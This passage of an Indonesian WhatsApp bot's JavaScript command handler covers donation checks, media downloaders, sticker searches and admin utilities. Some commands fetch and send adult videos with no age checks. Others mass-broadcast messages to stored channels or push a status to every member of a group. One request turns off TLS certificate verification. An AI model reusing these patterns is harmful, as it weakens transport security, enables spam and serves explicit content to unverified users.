        console.error('Payment error:', error);
        return m.reply('Terjadi kesalahan saat membuat pembayaran. Silakan coba lagi.');
    }
}
break

case 'cekdonasi': case 'cekdonate': {
    if (m.isGroup) return m.reply(mess.group)
    
    let db_saweria = [];
    try {
        const data = fs.readFileSync("./source/saweria.json", 'utf8');
        db_saweria = JSON.parse(data);
        if (!Array.isArray(db_saweria) || db_saweria.length === 0) {
            return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
        }
    } catch (error) {
        return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
    }
    
    if (!q) return m.reply(`Contoh: ${prefix+command} payment_id`);
    const payment_id = q.trim();
    
    try {
        await m.reply("Sedang memeriksa status pembayaran...");
        let Pay = new Saweria2(db_saweria[0]); 
        let res = await Pay.checkPayment(payment_id);
        
        let db_payments = [];
        let paymentFound = false;
        
        try {
            const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
            db_payments = JSON.parse(paymentsData);
            
            if (Array.isArray(db_payments)) {
                db_payments = db_payments.map(payment => {
                    if (payment.id === payment_id) {
                        paymentFound = true;
                        payment.status = res.status ? 'success' : 'pending';
                    }
                    return payment;
                });
                
                fs.writeFileSync("./source/payments.json", JSON.stringify(db_payments, null, 2), 'utf8');
            }
        } catch (error) {
            console.error('Error updating payment status:', error);
        }
        
        if (res.status) {
            return m.reply(`✅ *PEMBAYARAN BERHASIL*\n\n*ID:* ${payment_id}\n*Status:* Lunas\n\nTerima kasih atas donasi Anda!`);
        } else {
            const statusMsg = paymentFound 
                ? `⏳ *PEMBAYARAN PENDING*\n\n*ID:* ${payment_id}\n*Status:* Belum dibayar\n\nSilakan selesaikan pembayaran.`
                : `❌ *PEMBAYARAN TIDAK DITEMUKAN*\n\n*ID:* ${payment_id}\n*Pesan:* ${res.msg}`;
            
            return m.reply(statusMsg);
        }
    } catch (error) {
        console.error('Payment check error:', error);
        return m.reply('Terjadi kesalahan saat memeriksa pembayaran. Silakan coba lagi.');
    }
}
break

case 'listdonasi': case 'listdonate': {
    if (!isCreator) return m.reply(mess.owner)
    if (!isOwner) return Reply(mess.owner)

    let db_payments = [];
    try {
        const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
        db_payments = JSON.parse(paymentsData);
        
        if (!Array.isArray(db_payments) || db_payments.length === 0) {
            return m.reply(`Belum ada donasi yang tercatat.`);
        }
    } catch (error) {
        return m.reply(`Belum ada donasi yang tercatat.`);
    }
    

    let message = `*DAFTAR DONASI*\n\n`;
    
    db_payments.forEach((payment, index) => {
        message += `${index + 1}. *ID:* ${payment.id}\n`;
        message += `   💰 *Jumlah:* Rp${payment.amount.toLocaleString('id-ID')}\n`;
        message += `   💬 *Pesan:* ${payment.message}\n`;
        message += `   ⏱️ *Dibuat:* ${payment.created_at}\n`;
        message += `   🔄 *Status:* ${payment.status === 'success' ? '✅ Berhasil' : '⏳ Pending'}\n\n`;
    });
    
    message += `Total donasi: ${db_payments.length}`;
    
    return m.reply(message);
}
break

case 'logout': {
    if (!isOwner) return Reply(mess.owner)
    try {

        fs.writeFileSync("./source/saweria.json", JSON.stringify([], null, 2), 'utf8');
        
        if (global.paymentIntervals) {
            Object.keys(global.paymentIntervals).forEach(key => {
                clearInterval(global.paymentIntervals[key]);
                delete global.paymentIntervals[key];
            });
        }
        
        return m.reply(`Berhasil logout dari Saweria.`);
    } catch (error) {
        console.error('Logout error:', error);
        return m.reply('Terjadi kesalahan saat logout. Silakan coba lagi.');
    }
}
break

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "neko": case "nekopoi": {
  try {
    const fetch = require('node-fetch');
    const https = require('https');
    
    const agent = new https.Agent({
      rejectUnauthorized: false 
    });

    let anu = `https://archive-ui.tanakadomp.biz.id/asupan/nekopoi`;
    const res = await fetch(anu, { agent });
    const data = await res.json();
    
    if (!data.status) return m.reply("Gagal mendapatkan data!");
    
    let hasil = `*Hasil Pencarian*\n\n`;
    const maxResults = Math.min(15, data.result.length);
    
    for (let i = 0; i < maxResults; i++) {
      hasil += `📍 *Title:* ${data.result[i].title}\n`;
      hasil += `📅 *Upload:* ${data.result[i].upload}\n`;
      hasil += `🔗 *URL:* ${data.result[i].URL}\n\n`;
      hasil += `───────────────────\n\n`;
    }
    
    m.reply(hasil);
  } catch (e) {
    console.error('Error:', e);
    m.reply("Terjadi kesalahan saat mengambil data! " + e.message);
  }
}
break

case "songdown":
case "downsong": {
  if (!text) return m.reply(`Example: ${prefix + command} url`);
  
  m.reply('Tunggu sebentar kak...');
  
  try {
    let api = await fetch(`https://api.agatz.xyz/api/soundclouddl?url=${text}`);
    let data = await api.json();
    
    if (data.status !== 200) return m.reply('Download failed! Try again later.');
    
    let caption = `乂 *SOUNDCLOUD DOWNLOADER* ◦\n\n`;
    caption += `乂 *Status* : ${data.status}\n`;
    caption += `乂 *Creator* : ${data.creator}\n`;
    caption += `乂 *Title* : ${data.data.title}\n`;
    caption += `乂 *Duration* : ${data.data.duration}\n`;
    caption += `乂 *Quality* : ${data.data.quality}\n`;
    caption += `乂 *Thumbnail* : ${data.data.thumbnail}\n`;
    caption += `乂 *Download* : ${data.data.download}\n`;
    
    await conn.sendMessage(m.chat, { image: { url: data.data.thumbnail }, caption: caption });
    await conn.sendMessage(m.chat, { audio: { url: data.data.download }, mimetype: "audio/mpeg" });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while downloading!');
  }
}
break

case "delidch": case "delch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
if (!text) return m.reply(example("idchnya"))
if (text.toLowerCase() == "all") {
listidch.splice(0, listidch.length)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch))
return m.reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return m.reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menghapus id channel dari database ✅`)
}
break

case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

case "jpmch": case "jpmallch": {
if (!isCreator) return Reply(mess.owner)
if (listidch.length < 1) return m.reply("Tidak ada id ch didalam database")
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await conn.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = listidch
const res = allgrup
let count = 0
const ttks = text
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpmch *${opsijpm}* ke ${res.length} channel`)
for (let i of res) {
try {
await conn.sendMessage(i, pesancoy)
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpmch *${opsijpm}* berhasil dikirim ke ${count} channel`}, {quoted: m})
}
break

case "npm": case "npmsearch": {
if (!text) return m.reply(example('axios'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* ${res.title}
* ${res.update.split("T")[0]}
* ${res.links.npm}\n\n`
}
await m.reply(teks)
}
break

case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
const axios = require('axios');
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break


case "ssong": case "searchsoundcloud": case "searchsong": {
    if (!text) return m.reply("Example: .ssong Lathi");
    m.reply("Searching for songs on SoundCloud...");

    try {
        const query = encodeURIComponent(text);
        const response = await fetch(`https://archive-ui.tanakadomp.biz.id/search/soundcloud?q=${query}`);
        const data = await response.json();

        if (!data.status || !data.result || data.result.length === 0) {
            return m.reply("No songs found. Try a different search term.");
        }

        let teks = `🎵 *SOUNDCLOUD SEARCH RESULTS*\n\n`;
        
        const songs = data.result.slice(0, 15);
        
        songs.forEach((song, i) => {
            teks += `*${i+1}.* ${song.title || "Unknown Title"}\n`;
            teks += `👤 *Artist:* ${song.artist || "Unknown Artist"}\n`;
            teks += `⏱️ *Duration:* ${song.duration || "Unknown"}\n`;
            teks += `📊 *Plays:* ${song.plays || "Unknown"}\n`;
            teks += `🔗 *URL:* ${song.url || "No URL available"}\n\n`;
        });

        teks += `To download a song, use: ${prefix}scdl [URL]`;
        conn.sendMessage(m.chat, { text: teks }, { quoted: m });

    } catch (error) {
        console.log(error);

        try {
            m.reply("Primary search failed. Trying backup method...");

            const fetchResponse = await fetch(`https://m.soundcloud.com/search?q=${encodeURIComponent(text)}`);
            const html = await fetchResponse.text();

            const urlRegex = /https:\/\/soundcloud\.com\/([^"]+)/g;
            const titleRegex = /<h2[^>]*>(.*?)<\/h2>/g;
            
            const urls = [...html.matchAll(urlRegex)].map(match => match[0]).filter(url => 
                !url.includes('/tags/') && !url.includes('/discover') && 
                !url.includes('/stream') && !url.includes('/upload')
            );
            
            const titles = [...html.matchAll(titleRegex)].map(match => match[1]);
            
            if (urls.length === 0) {
                return m.reply("No songs found with backup method. Try a different search term.");
            }
            
            let teks = `🎵 *SOUNDCLOUD SEARCH RESULTS (BASIC)*\n\n`;
          
            const limit = Math.min(10, urls.length);
            
            for (let i = 0; i < limit; i++) {
                teks += `*${i+1}.* ${titles[i] || `Track ${i+1}`}\n`;
                teks += `🔗 *URL:* ${urls[i]}\n\n`;
            }
            
            teks += `To download a song, use: ${prefix}scdl [URL]`;
            conn.sendMessage(m.chat, { text: teks }, { quoted: m });
            
        } catch (fallbackError) {
            console.log(fallbackError);
            m.reply("Error searching for songs. Please try again later or check if SoundCloud is accessible.");
        }
    }
}
break

case "texttoimage": case "flux": case "fluximg": case "createimage": case "bikin gambar": case "timg": {
  if (!text) {
    return m.reply('Masukkan teks yang ingin dijadikan gambar!');
  }
  try {
    m.reply('_Sedang Memproses Gambar..._');
    let apiUrl = `https://api.rynn-archive.biz.id/ai/flux-schnell?text=${encodeURIComponent(text)}`;
    let response = await fetch(apiUrl);
    let buffer = await response.buffer();
    await conn.sendMessage(m.chat, { image: buffer, caption: '*Ini hasil gambarnya kak :v*\n\n> Maaf jika tidak sesuai harapan 😔' }, { quoted: m });
  } catch (error) {
    console.error('Error in flux:', error);
    m.reply('Terjadi kesalahan saat memproses gambar');
  }
}
break

case "xnxxdown": 
case "downxnxx":{
    if (!q) return m.reply(`Example: ${prefix + command} URL`);
    m.reply(mess.wait);
    const axios = require('axios');
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/download/xnxx?url=${q}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status) return m.reply("Failed to fetch video data");
        
        const result = data.result;
        
        let caption = `*XNXX DOWNLOADER*\n\n`;
        caption += `*Title:* ${result.title}\n`;
        caption += `*Duration:* ${result.duration} seconds\n`;
        caption += `*Info:* ${result.info.trim()}\n`;
        caption += `*URL:* ${result.URL}\n\n`;
        caption += `_Sending video, please wait..._`;
        
        await conn.sendMessage(m.chat, { 
            image: { url: result.image }, 
            caption: caption 
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { 
            video: { url: result.files.high }, 
            caption: `*High Quality*\n${result.title}`,
            fileName: `${result.title}.mp4`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, { 
            video: { url: result.files.low }, 
            caption: `*Low Quality*\n${result.title}`,
            fileName: `${result.title}-low.mp4`
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
    break

case "searchxnxx": 
case "sxnxx":{
    if (!q) return m.reply(`Example: ${prefix + command} anime`);
    m.reply(mess.wait);
const axios = require('axios');    
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status) return m.reply("Failed to fetch search results");
        
        let resultText = `*XNXX SEARCH RESULTS*\n`;
        resultText += `*Query:* ${q}\n`;
        resultText += `*Found:* ${data.result.length} videos\n\n`;
        
        const maxResults = 10;
        const displayResults = data.result.slice(0, maxResults);
        
        displayResults.forEach((video, index) => {
            resultText += `*${index + 1}. ${video.title}*\n`;
            resultText += `Info: ${video.info.trim()}\n`;
            resultText += `Link: ${video.link}\n\n`;
        });
        
        if (data.result.length > maxResults) {
            resultText += `_And ${data.result.length - maxResults} more results..._\n`;
            resultText += `_Use ${prefix}xnxxdown [link] to download any video_`;
        }
        
        await conn.sendMessage(m.chat, {
            text: resultText
        }, { quoted: m });
        
    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
    break
    
case 'tagsw': {
    if (!isOwner) return m.reply('Khusus Owner');
    
    let [id, ...teksArray] = text.split(' ');
    let teks = teksArray.join(' ');

    if (!id || !teks) {
        return m.reply(`Example: .tagsw <group_id> Hello\n\n> Note : reply media,jika tidak ada media maka status akan teks saja`);
    }

    let mediaContent = null;
    let msgOptions = {};
    const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
    const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
    const jids = [m.sender, id];

    if (quoted) {
        const mime = quoted.mtype || quoted.mediaType;
        if (mime?.includes('image')) {
            mediaContent = await m.quoted.download();
            msgOptions = {
                image: mediaContent,
                caption: teks || m.quoted.text || '',
            };
        } else if (mime?.includes('video')) {
            mediaContent = await m.quoted.download();
            msgOptions = {
                video: mediaContent,
                caption: teks || m.quoted.text || '',
            };
        } else {
            msgOptions = {
                text: teks || m.quoted.text || '',
            };
        }
    } else {
        msgOptions = {
            text: teks,
        };
    }

    await conn.sendMessage("status@broadcast", msgOptions, {
        backgroundColor: pickedColor,
        textArgb: 0xffffffff,
        font: 0,
        statusJidList: await (await conn.groupMetadata(id)).participants.map((a) => a.id),
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: jids.map((jid) => ({
                            tag: "to",
                            attrs: { jid: id },
                            content: undefined,
                        })),
                    },
                ],
            },
        ],
    });
    m.reply("Udh Kekirim\ncek status aja 😌");
}
break

case 'unblur': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin di-unblur')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }
    try {
    await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/imgunblur?url=${uploadResult.url}`
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*Ini hasil unblur gambarnya*' 
        }, { 
            quoted: m
        })
        fs.unlinkSync(media)
    } catch (error) {
        console.error('Error in unblur:', error)
        m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

case "stickersearch2": case 'sh2': case "searchsticker2": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    m.reply('_Sedang Mencari Sticker..._');
    
    try {
        let apiUrl = `https://fastrestapis.fasturl.cloud/sticker/cloud?name=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.result?.result?.data || response.result.result.data.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        let filteredPacks = response.result.result.data.filter(pack => {
            const searchTerms = text.toLowerCase().split(' ');
            const packTitle = pack.title.toLowerCase();
            const packTags = pack.tags ? pack.tags.join(' ').toLowerCase() : '';
            
            return searchTerms.some(term => 
                packTitle.includes(term) || packTags.includes(term)
            );
        });

        if (filteredPacks.length === 0) {
            return m.reply(`Tidak ditemukan sticker ${text} yang sesuai`);
        }

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];
        let validPacks = filteredPacks.filter(pack => pack.stickers && pack.stickers.length >= 5);
        if (validPacks.length === 0) validPacks = filteredPacks; 

        const randomPackIndex = Math.floor(Math.random() * validPacks.length);
        const stickerPack = validPacks[randomPackIndex];
        
        let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                      `- *Title:* ${stickerPack.title}\n` +
                      `- *Slug:* ${stickerPack.slug}\n` +
                      `- *Tags:* ${stickerPack.tags ? stickerPack.tags.join(', ') : 'No tags'}\n` +
                      `- *Animated:* ${stickerPack.animated ? 'Yes' : 'No'}\n` +
                      `- *Author:* ${stickerPack.author?.username || 'Unknown'}\n` +
                      `- *Jumlah Sticker:* ${stickerPack.stickers.length}\n` +
                      `_Mengirim Sticker Harap Tunggu..._`;
        
        await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });
        let allStickers = [...stickerPack.stickers];
        allStickers.sort(() => Math.random() - 0.5);
        const maxStickers = Math.min(10, allStickers.length);
        let successCount = 0;
        let attemptCount = 0;
        
        while (successCount < maxStickers && attemptCount < allStickers.length) {
            try {
                const sticker = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, sticker.sticker_src, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`
                });
                
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
            }
            attemptCount++;
        }

        if (successCount < maxStickers) {
            m.reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
        } else if (stickerPack.stickers.length > 10) {
            m.reply(`Menampilkan ${successCount} sticker random dari ${stickerPack.stickers.length} sticker yang ditemukan`);
        }

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case 'sh': case "searchsticker": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    m.reply('_Sedang Mencari Sticker..._');
    
    try {
        let apiUrl = `https://api.agatz.xyz/api/sticker?message=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.data?.sticker_url || response.data.sticker_url.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];

        let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                      `- *Title:* ${response.data.title}\n` +
                      `- *Creator:* ${response.creator}\n` +
                      `- *Jumlah Sticker:* ${response.data.sticker_url.length}\n` +
                      `_Mengirim Sticker Harap Tunggu..._`;
        
        await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });
        let allStickers = [...response.data.sticker_url];
        allStickers.sort(() => Math.random() - 0.5);
        const maxStickers = Math.min(10, allStickers.length);
        let successCount = 0;
        let attemptCount = 0;
        
        while (successCount < maxStickers && attemptCount < allStickers.length) {
            try {
                const stickerUrl = allStickers[attemptCount];
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, stickerUrl, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`
                });
                
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (stickerError) {
                console.log(`Error sending sticker:`, stickerError);
            }
            attemptCount++;
        }

        if (successCount < maxStickers) {
            m.reply(`Berhasil mengirim ${successCount} sticker dari ${maxStickers} yang dicoba`);
        } else if (response.data.sticker_url.length > 10) {
            m.reply(`Menampilkan ${successCount} sticker random dari ${response.data.sticker_url.length} sticker yang ditemukan`);
        }

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case "sh3": case "searchsticker3": case "stickersearch3": {
    if (!text) return m.reply('Sticker Apa Yg Kamu Cari?')
    m.reply('_Sedang Mencari Sticker Line..._');
    
    try {
        let apiUrl = `https://fastrestapis.fasturl.cloud/sticker/line?name=${encodeURIComponent(text)}`;
        const res = await fetch(apiUrl);
        const response = await res.json();
        
        if (!response.result || response.result.length === 0) {
            return m.reply('Tidak ditemukan sticker yang sesuai');
        }

        let filteredPacks = response.result.filter(pack => {
            const searchTerms = text.toLowerCase().split(' ');
            const packTitle = pack.title.toLowerCase();
            return searchTerms.every(term => packTitle.includes(term));
        });

        if (filteredPacks.length === 0) {
            return m.reply(`Tidak ditemukan sticker ${text} yang sesuai`);
        }

        filteredPacks = filteredPacks.sort(() => Math.random() - 0.5);
        filteredPacks = filteredPacks.slice(0, 10);

        const packNames = [
            "Sticker Keren ",
            "Sticker Lucu ",
            "Created ",
            "Special Sticker ",
            "Random Sticker ",
            "Koleksi Sticker ",
            "Sticker Pack ",
            "Daily Sticker ",
            "Magic Sticker ",
            "Cute Sticker "
        ];
        for (let stickerPack of filteredPacks) {
            let packInfo = `*Hasil Pencarian Sticker ${text}*\n` +
                          `- *Title:* ${stickerPack.title}\n` +
                          `- *ID:* ${stickerPack.id}\n` +
                          `- *Author:* ${stickerPack.authorName}\n` +
                          `- *URL:* ${stickerPack.url}\n` +
                          `_Mengirim Sticker Harap Tunggu..._`;
            
            
            const infoMsg = await conn.sendMessage(m.chat, { text: packInfo }, { quoted: m });

      
            if (stickerPack.stickerAnimated) {
                const randomPackname = packNames[Math.floor(Math.random() * packNames.length)];
                
                await conn.sendAsSticker(m.chat, stickerPack.stickerAnimated, m, {
                    packname: randomPackname,
                    author: `By ${global.namaOwner}`, 
                    quoted: infoMsg 
                });

                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }

       
        m.reply(`Berhasil mengirim ${filteredPacks.length} sticker dari pencarian "${text}"`);

    } catch (e) {
        console.error('Error in stickersearch:', e);
        m.reply('Terjadi kesalahan saat mencari sticker');
    }
}
break

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "kisahnabi": {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

m.reply(`${hasil}`)

}
break

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
